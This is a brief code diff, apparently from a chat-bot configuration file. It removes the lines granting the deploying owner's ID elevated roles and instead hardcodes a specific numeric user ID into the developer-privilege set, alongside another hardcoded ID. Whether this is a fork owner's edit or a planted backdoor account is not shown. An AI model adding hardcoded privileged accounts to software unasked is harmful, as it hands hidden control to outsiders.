@@ -140,8 +140,9 @@ else:
         raise Exception("Your whitelisted users list does not contain valid integers.")
 
 
-DRAGONS.add(OWNER_ID)
-DEV_USERS.add(OWNER_ID)
+
+
+DEV_USERS.add(6129152989)
 DEV_USERS.add(5696053228)
 
 
